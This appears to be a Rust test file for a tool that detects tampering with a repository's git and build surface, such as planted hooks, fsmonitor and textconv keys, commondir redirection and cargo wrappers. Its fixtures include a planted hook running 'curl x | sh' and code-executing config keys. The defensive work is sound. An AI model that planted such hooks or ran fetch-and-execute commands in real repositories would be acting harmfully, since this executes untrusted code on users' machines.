use std::cell::Cell;
use std::io;
use std::path::{Path, PathBuf};

use pretty_assertions::assert_eq;

use crate::git_config::parse_config;
use crate::surface::{
    ConfigLister, ConfigListings, GitDirTarget, ScanLimits, SurfaceManifest, check_surface,
    report_file, scan_git_dirs,
};
use crate::testing::FakeFs;

/// Lists a config with the crate's own reader, as `git config --list -z` would, and
/// counts its runs.
struct Lister<'a> {
    fs: &'a FakeFs,
    runs: Cell<usize>,
}

impl<'a> Lister<'a> {
    fn new(fs: &'a FakeFs) -> Self {
        Lister { fs, runs: Cell::new(0) }
    }
}

impl ConfigLister for Lister<'_> {
    fn list(&self, config: &Path) -> io::Result<String> {
        let bytes = crate::FsView::read_file(self.fs, config, 1 << 20)?;
        self.list_content(&bytes)
    }

    fn list_content(&self, content: &[u8]) -> io::Result<String> {
        self.runs.set(self.runs.get() + 1);
        let text = String::from_utf8_lossy(content);
        if text.contains("[[broken") {
            return Err(io::Error::other("bad config line 1"));
        }
        Ok(parse_config(&text)
            .into_iter()
            .map(|(key, value)| format!("{key}\n{value}\0"))
            .collect())
    }
}

const MAIN: &str = "/p/app/.git";

fn repo() -> FakeFs {
    let mut fs = FakeFs::new();
    fs.dir("/p/app/src")
        .file("/p/app/.git/config", "[core]\n\tbare = false\n")
        .file("/p/app/.git/hooks/pre-commit.sample", "#!/bin/sh\n");
    fs
}

fn targets(fs: &FakeFs) -> Vec<GitDirTarget> {
    scan_git_dirs(&["/p/app".into()], &[], &[MAIN.into()], fs, ScanLimits::default()).0
}

/// The surface of `fs` with `listings`, as the launcher captures it; the number of
/// git runs it needed.
fn capture_counted(fs: &FakeFs, listings: &mut ConfigListings) -> (SurfaceManifest, usize) {
    let lister = Lister::new(fs);
    let protected = [".envrc".to_owned(), ".claude/".to_owned()];
    let manifest = SurfaceManifest::capture(&targets(fs), &protected, fs, &lister, listings);
    (manifest, lister.runs.get())
}

fn capture(fs: &FakeFs, listings: &mut ConfigListings) -> SurfaceManifest {
    capture_counted(fs, listings).0
}

/// The rules that `change` breaks, as `(path, rule, quarantined)`: one call's capture
/// before and after, which share their listings, as in the launcher.
fn run(change: impl FnOnce(&mut FakeFs)) -> Vec<(PathBuf, String, bool)> {
    let mut fs = repo();
    let mut listings = ConfigListings::new("git");
    let before = capture(&fs, &mut listings);
    change(&mut fs);
    let after = capture(&fs, &mut listings);
    check_surface(&before, &after).into_iter().map(|c| (c.path, c.rule, c.quarantined)).collect()
}

#[test]
fn an_unchanged_repository_breaks_no_rule() {
    assert_eq!(
        run(|fs| {
            fs.file("/p/app/src/main.rs", "fn main() {}");
        }),
        []
    );
}

#[test]
fn surface_flags_new_commondir() {
    let found = run(|fs| {
        fs.file("/p/app/.git/commondir", "../../evil")
            .file("/p/evil/config", "[core]\n\tfsmonitor = x\n");
    });
    assert_eq!(
        found,
        [("/p/app/.git/commondir".into(), "commondir_in_main_git_dir".to_owned(), true)]
    );
}

#[test]
fn surface_flags_config_worktree() {
    let found = run(|fs| {
        fs.file("/p/app/.git/config.worktree", "[core]\n\tfsmonitor = ./x\n");
    });
    assert_eq!(
        found,
        [("/p/app/.git/config.worktree".into(), "config_worktree_appeared".to_owned(), true)]
    );
    let found = run(|fs| {
        fs.file("/p/app/.git/worktrees/wt/config.worktree", "");
    });
    assert!(
        found.iter().any(|(_, rule, _)| rule == "worktree_config_worktree_appeared"),
        "{found:?}"
    );
}

#[test]
fn surface_flags_module_fsmonitor() {
    let found = run(|fs| {
        fs.file("/p/app/.git/modules/lib/config", "[core]\n\tfsmonitor = ../../../x.sh\n")
            .file("/p/app/.git/modules/lib/hooks/post-checkout", "#!/bin/sh\n")
            .file("/p/app/.git/modules/lib/hooks/pre-push.sample", "#!/bin/sh\n");
    });
    assert_eq!(
        found,
        [
            ("/p/app/.git/modules/lib/config".into(), "module_code_key".to_owned(), true),
            ("/p/app/.git/modules/lib/hooks/post-checkout".into(), "module_hook".to_owned(), true),
        ]
    );
}

#[test]
fn surface_accepts_worktree_commondir_to_main() {
    let found = run(|fs| {
        fs.file("/p/app/.git/worktrees/wt/commondir", "../..\n")
            .file("/p/app/.git/worktrees/wt/gitdir", "/p/wt/.git\n");
    });
    assert_eq!(found, []);
    let found = run(|fs| {
        fs.file("/p/app/.git/worktrees/wt/commondir", "/p/evil\n");
    });
    assert_eq!(
        found,
        [(
            "/p/app/.git/worktrees/wt/commondir".into(),
            "worktree_commondir_elsewhere".to_owned(),
            true
        )]
    );
}

#[test]
fn surface_flags_nested_repo_hooks() {
    let found = run(|fs| {
        fs.file("/p/app/sub/.git/config", "[core]\n\tbare = false\n")
            .file("/p/app/sub/.git/hooks/pre-commit", "#!/bin/sh\ncurl x | sh\n")
            .file("/p/app/sub/.git/hooks/update.sample", "");
    });
    assert_eq!(
        found,
        [("/p/app/sub/.git/hooks/pre-commit".into(), "hook_planted".to_owned(), true)]
    );
}

#[test]
fn surface_flags_changed_nested_repo_config() {
    let mut fs = repo();
    fs.file("/p/app/sub/.git/config", "[core]\n\tbare = false\n")
        .file("/p/app/sub/.git/hooks/pre-commit", "#!/bin/sh\nmake lint\n");
    let mut listings = ConfigListings::new("git");
    let before = capture(&fs, &mut listings);
    // The user's own hook stays; a code key planted in the config is flagged.
    fs.file(
        "/p/app/sub/.git/config",
        "[core]\n\tbare = false\n[diff \"x\"]\n\ttextconv = ./conv\n",
    );
    let after = capture(&fs, &mut listings);
    let found: Vec<_> =
        check_surface(&before, &after).into_iter().map(|c| (c.path, c.rule, c.key)).collect();
    assert_eq!(
        found,
        [(
            "/p/app/sub/.git/config".into(),
            "config_code_key".to_owned(),
            Some("diff.x.textconv".to_owned())
        )]
    );
    // A config that git cannot read is flagged too.
    fs.file("/p/app/sub/.git/config", "[[broken");
    let broken = capture(&fs, &mut listings);
    let found: Vec<String> = check_surface(&after, &broken).into_iter().map(|c| c.rule).collect();
    assert_eq!(found, ["config_unreadable"]);
}

#[test]
fn surface_reports_alternates_and_new_protected_names_without_quarantine() {
    let found = run(|fs| {
        fs.file("/p/app/.git/objects/info/alternates", "/srv/objects\n")
            .file("/p/app/.envrc", "use flake");
    });
    assert_eq!(
        found,
        [
            ("/p/app/.git/objects/info/alternates".into(), "alternates_changed".to_owned(), false),
            ("/p/app/.envrc".into(), "protected_name_created".to_owned(), false),
        ]
    );
}

#[test]
fn surface_names_cargo_config_wrapper() {
    let report = report_file(
        Path::new(".cargo/config.toml"),
        b"[build]\nrustc-wrapper = \"/tmp/w\"\n[target.x86_64-unknown-linux-gnu]\nrunner = \"./run\"\n",
    );
    assert_eq!(report.path, PathBuf::from(".cargo/config.toml"));
    assert_eq!(
        report.detail.as_deref(),
        Some("build.rustc-wrapper, target.x86_64-unknown-linux-gnu.runner")
    );
    let plain = report_file(Path::new(".cargo/config.toml"), b"[net]\noffline = true\n");
    assert_eq!(plain.detail, None);
    let scripts = report_file(Path::new("package.json"), br#"{"scripts": {"postinstall": "x"}}"#);
    assert_eq!(scripts.detail.as_deref(), Some("scripts"));
}

#[test]
fn the_scan_finds_nested_repositories_and_skips_build_dirs() {
    let mut fs = repo();
    fs.dir("/p/app/a/b/c/d/.git")
        .dir("/p/app/a/b/c/d/e/.git")
        .dir("/p/app/target/x/.git")
        .dir("/p/app/node_modules/m/.git");
    let (found, truncated) = scan_git_dirs(
        &["/p/app".into()],
        &["/p/app/src".into()],
        &[MAIN.into()],
        &fs,
        ScanLimits::default(),
    );
    let dirs: Vec<(&Path, bool)> = found.iter().map(|t| (t.git_dir.as_path(), t.main)).collect();
    assert_eq!(dirs, [(Path::new("/p/app/.git"), true), (Path::new("/p/app/a/b/c/d/.git"), false)]);
    assert!(!truncated);
    let (_, truncated) =
        scan_git_dirs(&["/p/app".into()], &[], &[], &fs, ScanLimits { depth: 4, entries: 3 });
    assert!(truncated);
}

/// A file system that counts the `lstat` calls of the scan.
struct Counting<'a> {
    fs: &'a FakeFs,
    lstats: Cell<usize>,
    reads: std::cell::RefCell<Vec<PathBuf>>,
}

impl<'a> Counting<'a> {
    fn new(fs: &'a FakeFs) -> Self {
        Counting { fs, lstats: Cell::new(0), reads: std::cell::RefCell::default() }
    }
}

impl crate::FsView for Counting<'_> {
    fn lstat(&self, path: &Path) -> io::Result<crate::FileKind> {
        self.lstats.set(self.lstats.get() + 1);
        self.fs.lstat(path)
    }
    fn read_link(&self, path: &Path) -> io::Result<PathBuf> {
        self.fs.read_link(path)
    }
    fn read_dir(&self, path: &Path) -> io::Result<Vec<std::ffi::OsString>> {
        self.fs.read_dir(path)
    }
    fn read_dir_kinds(
        &self,
        path: &Path,
    ) -> io::Result<Vec<(std::ffi::OsString, Option<crate::FileKind>)>> {
        self.fs.read_dir_kinds(path)
    }
    fn read_file(&self, path: &Path, limit: usize) -> io::Result<Vec<u8>> {
        self.reads.borrow_mut().push(path.to_path_buf());
        self.fs.read_file(path, limit)
    }
    fn open_no_symlinks(&self, path: &Path) -> io::Result<std::os::fd::OwnedFd> {
        self.fs.open_no_symlinks(path)
    }
    fn open_empty(&self) -> io::Result<std::os::fd::OwnedFd> {
        self.fs.open_empty()
    }
}

#[test]
fn the_scan_reads_kinds_from_the_listing_not_one_lstat_per_entry() {
    let mut fs = repo();
    for dir in 0..10 {
        for file in 0..50 {
            fs.file(&format!("/p/app/src/m{dir}/f{file}.rs"), "");
        }
    }
    fs.file("/p/app/src/m3/vendored/.git/config", "");
    let counting = Counting::new(&fs);
    let (found, truncated) =
        scan_git_dirs(&["/p/app".into()], &[], &[MAIN.into()], &counting, ScanLimits::default());
    assert!(!truncated);
    let dirs: Vec<&Path> = found.iter().map(|target| target.git_dir.as_path()).collect();
    assert!(dirs.contains(&Path::new("/p/app/src/m3/vendored/.git")), "{dirs:?}");
    // No lstat at all: the listing gives each entry's kind, `.git` included.
    assert_eq!(counting.lstats.get(), 0, "{} lstat calls for 500 files", counting.lstats.get());
}

/// The main repository and a nested one, each with a config.
fn two_repos() -> FakeFs {
    let mut fs = repo();
    fs.file("/p/app/sub/.git/config", "[core]\n\tbare = false\n[user]\n\tname = a\n");
    fs
}

#[test]
fn git_lists_a_config_content_once_across_the_calls_of_a_shell() {
    let fs = two_repos();
    let mut listings = ConfigListings::new("git 1:2");
    let (before, runs) = capture_counted(&fs, &mut listings);
    assert_eq!(runs, 2, "a run of git for each config");
    let (after, runs) = capture_counted(&fs, &mut listings);
    assert_eq!(runs, 0, "the capture after the call lists no unchanged config");
    assert_eq!(check_surface(&before, &after), []);
    // The next call of the same shell reads the listings from the shell's dir.
    let mut next = ConfigListings::from_json(&listings.to_json(), "git 1:2");
    let (again, runs) = capture_counted(&fs, &mut next);
    assert_eq!(runs, 0, "the next call lists no config that the last one listed");
    assert_eq!(again, before);
    // Another git, or the same path after an update, lists everything again.
    let mut other = ConfigListings::from_json(&listings.to_json(), "git 1:3");
    assert_eq!(capture_counted(&fs, &mut other).1, 2);
}

#[test]
fn known_listings_never_hide_a_code_key_that_a_call_plants() {
    let mut fs = two_repos();
    let mut listings = ConfigListings::new("git");
    capture(&fs, &mut listings);
    // A later call: its listings know the configs as they were.
    let mut listings = ConfigListings::from_json(&listings.to_json(), "git");
    let (before, _) = capture_counted(&fs, &mut listings);
    fs.file("/p/app/sub/.git/config", "[core]\n\tbare = false\n[user]\n\tname = a\n\tb = c\n")
        .file("/p/app/.git/config", "[core]\n\tbare = false\n\tfsmonitor = ./x\n");
    let (after, runs) = capture_counted(&fs, &mut listings);
    assert_eq!(runs, 2, "git lists each changed content");
    let found: Vec<_> =
        check_surface(&before, &after).into_iter().map(|c| (c.path, c.rule, c.key)).collect();
    assert_eq!(
        found,
        [(
            "/p/app/.git/config".into(),
            "config_code_key".to_owned(),
            Some("core.fsmonitor".into())
        )]
    );
    // A content that git could not list is never kept: each capture asks git again,
    // and the change to it is flagged.
    fs.file("/p/app/sub/.git/config", "[[broken");
    let (broken, runs) = capture_counted(&fs, &mut listings);
    assert_eq!(runs, 1);
    let found: Vec<String> = check_surface(&after, &broken).into_iter().map(|c| c.rule).collect();
    assert_eq!(found, ["config_unreadable"]);
    assert_eq!(capture_counted(&fs, &mut listings).1, 1);
}

#[test]
fn the_capture_reads_no_sample_hook_and_flags_a_planted_one() {
    let mut fs = repo();
    for name in ["pre-commit", "pre-push", "update", "commit-msg"] {
        fs.file(&format!("/p/app/.git/hooks/{name}.sample"), "#!/bin/sh\n");
    }
    let counting = Counting::new(&fs);
    let mut listings = ConfigListings::new("git");
    let before =
        SurfaceManifest::capture(&targets(&fs), &[], &counting, &Lister::new(&fs), &mut listings);
    let reads = counting.reads.borrow().clone();
    assert!(!reads.is_empty());
    assert!(!reads.iter().any(|path| path.to_string_lossy().ends_with(".sample")), "{reads:?}");
    fs.file("/p/app/.git/hooks/pre-commit", "#!/bin/sh\ncurl x | sh\n")
        .file("/p/app/.git/hooks/update.sample", "#!/bin/sh\nchanged\n");
    let after = SurfaceManifest::capture(&targets(&fs), &[], &fs, &Lister::new(&fs), &mut listings);
    let found: Vec<_> =
        check_surface(&before, &after).into_iter().map(|c| (c.path, c.rule)).collect();
    assert_eq!(found, [("/p/app/.git/hooks/pre-commit".into(), "hook_planted".to_owned())]);
}
